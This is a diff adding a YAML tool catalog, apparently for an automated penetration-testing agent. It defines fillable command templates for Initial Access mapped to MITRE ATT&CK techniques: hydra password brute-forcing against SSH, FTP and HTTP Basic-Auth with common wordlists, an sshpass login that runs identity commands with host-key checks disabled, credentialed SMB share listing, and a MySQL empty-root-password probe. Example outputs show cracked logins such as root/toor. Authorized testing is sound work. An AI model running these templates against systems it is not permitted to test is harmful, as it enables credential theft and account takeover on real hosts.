@@ -1,0 +1,152 @@
+# Initial Access (TA0001): credential brute-force, default-cred logins, and
+# valid-account abuse. All run from Kali against a target service.
+
+tools:
+  - name: hydra_ssh_password_list
+    category: exploit
+    description: Brute-force SSH login with a username and password list.
+    command_template: "hydra -l {user} -P {wordlist} -t 4 -f -o /tmp/hydra-ssh-{ip}.txt ssh://{ip}:{port}"
+    slots:
+      - { name: ip, type: ip, description: SSH target }
+      - { name: port, type: port, description: SSH port, default: 22 }
+      - { name: user, type: free_string, description: username to test }
+      - name: wordlist
+        type: wordlist_id
+        description: password wordlist
+        values:
+          - "/usr/share/wordlists/rockyou.txt"
+          - "/usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-1000.txt"
+          - "/usr/share/seclists/Passwords/probable-v2-top1575.txt"
+        default: "/usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-1000.txt"
+    runtime_cap_seconds: 1800
+    output_parser_id: hydra
+    requires_root: false
+    attack:
+      matrices: [enterprise]
+      tactics: [TA0001, TA0006]
+      techniques: [T1110.001, T1110.003, T1078]
+    example_invocation:
+      ip: 10.10.10.5
+      port: 22
+      user: root
+      wordlist: "/usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-1000.txt"
+    example_output: |
+      [22][ssh] host: 10.10.10.5   login: root   password: toor
+
+  - name: hydra_ftp_password_list
+    category: exploit
+    description: Brute-force FTP login.
+    command_template: "hydra -l {user} -P {wordlist} -t 4 -f -o /tmp/hydra-ftp-{ip}.txt ftp://{ip}"
+    slots:
+      - { name: ip, type: ip, description: FTP target }
+      - { name: user, type: free_string, description: username }
+      - name: wordlist
+        type: wordlist_id
+        description: password wordlist
+        values:
+          - "/usr/share/wordlists/rockyou.txt"
+          - "/usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-1000.txt"
+        default: "/usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-1000.txt"
+    runtime_cap_seconds: 1200
+    output_parser_id: hydra
+    attack:
+      matrices: [enterprise]
+      tactics: [TA0001, TA0006]
+      techniques: [T1110.001, T1110.003]
+    example_invocation:
+      ip: 10.10.10.5
+      user: anonymous
+      wordlist: "/usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-1000.txt"
+    example_output: |
+      [21][ftp] host: 10.10.10.5   login: admin   password: admin
+
+  - name: hydra_http_basic_auth
+    category: exploit
+    description: Brute-force HTTP Basic-Auth (RFC 7617) on a protected path.
+    command_template: "hydra -l {user} -P {wordlist} -t 4 -f {ip} -s {port} http-get {path}"
+    slots:
+      - { name: ip, type: ip, description: web host }
+      - { name: port, type: port, description: web port, default: 80 }
+      - { name: user, type: free_string, description: username }
+      - { name: path, type: file_path, description: Basic-Auth-protected URL path, default: / }
+      - name: wordlist
+        type: wordlist_id
+        description: password wordlist
+        values:
+          - "/usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-1000.txt"
+          - "/usr/share/seclists/Passwords/probable-v2-top1575.txt"
+        default: "/usr/share/seclists/Passwords/probable-v2-top1575.txt"
+    runtime_cap_seconds: 1500
+    output_parser_id: hydra
+    attack:
+      matrices: [enterprise]
+      tactics: [TA0001, TA0006]
+      techniques: [T1110.001, T1110.003]
+    example_invocation:
+      ip: 10.10.10.5
+      port: 80
+      user: admin
+      path: /admin
+      wordlist: "/usr/share/seclists/Passwords/probable-v2-top1575.txt"
+    example_output: |
+      [80][http-get] host: 10.10.10.5   login: admin   password: password123
+
+  - name: smbclient_with_credentials
+    category: exploit
+    description: Authenticate to an SMB share with username/password.
+    command_template: "smbclient -L //{ip} -U '{user}%{password}' --option=client_min_protocol=NT1"
+    slots:
+      - { name: ip, type: ip, description: SMB host }
+      - { name: user, type: free_string, description: SMB username }
+      - { name: password, type: free_string, description: SMB password }
+    runtime_cap_seconds: 60
+    output_parser_id: smbclient
+    attack:
+      matrices: [enterprise]
+      tactics: [TA0001, TA0007]
+      techniques: [T1078, T1135]
+    example_invocation: { ip: 10.10.10.5, user: bob, password: hunter2 }
+    example_output: |
+            Sharename       Type      Comment
+            ---------       ----      -------
+            home            Disk      Bob's home directory
+
+  - name: ssh_login_with_password
+    category: exploit
+    description: Test an SSH login with a single user/password (no brute force).
+    command_template: "sshpass -p {password} ssh -o StrictHostKeyChecking=no -o ConnectTimeout=5 {user}@{ip} -p {port} 'whoami; id; uname -a'"
+    slots:
+      - { name: ip, type: ip, description: SSH target }
+      - { name: port, type: port, description: SSH port, default: 22 }
+      - { name: user, type: free_string, description: username }
+      - { name: password, type: free_string, description: password to test }
+    runtime_cap_seconds: 30
+    output_parser_id: lines
+    attack:
+      matrices: [enterprise]
+      tactics: [TA0001]
+      techniques: [T1078, T1021.004]
+    example_invocation: { ip: 10.10.10.5, port: 22, user: root, password: toor }
+    example_output: |
+      root
+      uid=0(root) gid=0(root) groups=0(root)
+      Linux target 5.10.0 #1 SMP
+
+  - name: mysql_default_creds
+    category: exploit
+    description: Probe MySQL for empty-password root login.
+    command_template: "mysql -h {ip} -P {port} -u {user} -e 'select version();'"
+    slots:
+      - { name: ip, type: ip, description: MySQL host }
+      - { name: port, type: port, description: MySQL port, default: 3306 }
+      - { name: user, type: enum, description: username, values: [root, admin, mysql], default: root }
+    runtime_cap_seconds: 15
+    output_parser_id: lines
+    attack:
+      matrices: [enterprise]
+      tactics: [TA0001, TA0006]
+      techniques: [T1078.001]
+    example_invocation: { ip: 10.10.10.5, port: 3306, user: root }
+    example_output: |
+      version()
+      8.0.30
